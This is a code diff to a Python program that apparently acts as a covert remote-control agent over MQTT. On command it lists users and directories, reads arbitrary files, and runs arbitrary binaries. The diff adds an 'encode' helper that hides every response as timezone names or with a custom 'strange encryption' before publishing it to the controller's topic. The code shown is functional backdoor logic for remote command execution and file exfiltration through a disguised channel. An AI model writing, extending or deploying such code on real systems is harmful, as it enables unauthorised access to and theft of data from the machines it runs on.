@@ -152,6 +152,12 @@ def decode_as_timezones(timezones_encoded_msg):
             decoded.append(TIMEZONE_TO_CHAR[tz.upper()])
     return ''.join(decoded)
 
+def encode(text: str):
+    if len(text) <= 100:
+        return [MSG_FIELD_TIMEZONES, encode_as_timezones(text)]
+    else:
+        return [MSG_FIELD_ENCRYPTED_MSG, do_very_strange_encryption(text)]
+
 ################################### COMMON CODE ENDS HERE ###################################
 
 
@@ -210,44 +216,44 @@ def execute_action(client, action: int, path: str = None):
             # execute 'w' command to list logged in users
             result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
             output_text = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-            response[MSG_FIELD_TIMEZONES] = encode_as_timezones(output_text)
+            response.update(encode(output_text))
         
         elif action == CMD_LIST_DIR:
             if not path:
-                response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption("Error: Path is missing.")
+                response.update(encode("Error: Path is missing."))
             else:
                 result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
                 output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-                response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(output)
+                response.update(encode(output))
             
         elif action == CMD_GET_USER_ID:
             # execute 'id' command to get user id
             result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
             output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-            response[MSG_FIELD_ENCRYPTED_MSG] = encode_as_timezones(output)
+            response.update(encode(output))
             
         elif action == CMD_DOWNLOAD_FILE:
             if not path:
-                response[MSG_FIELD_ENCRYPTED_MSG] = encode_as_timezones("Path is missing.")
+                response.update(encode("Path is missing."))
             else:
                 with open(path, 'r') as file:
                     content = file.read()
-                response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(content)
+                response.update(encode(content))
             
         elif action == CMD_EXECUTE_BINARY:
             if not path:
-                response[MSG_FIELD_ENCRYPTED_MSG] = encode_as_timezones("Path is missing.")
+                response.update(encode("Path is missing."))
             else:  
                 result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
-                output = f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}\n\nReturn code: {result.returncode}"
-                response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(output)
+                output = f"STDOUT {result.stdout} STDERR {result.stderr}"
+                response.update(encode(output))
     
     except FileNotFoundError:
-        response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(f"Error: File {path} not found")
+        response.update(encode(f"Error: File {path} not found"))
     except subprocess.TimeoutExpired:
-        response[MSG_FIELD_ENCRYPTED_MSG] = encode_as_timezones("Timeout")
+        response.update(encode("Timeout"))
     except Exception as ex:
-        response[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(str(ex))
+        response.update(encode(str(ex)))
         
     client.publish(MQTT_TOPIC, json.dumps(response))
 
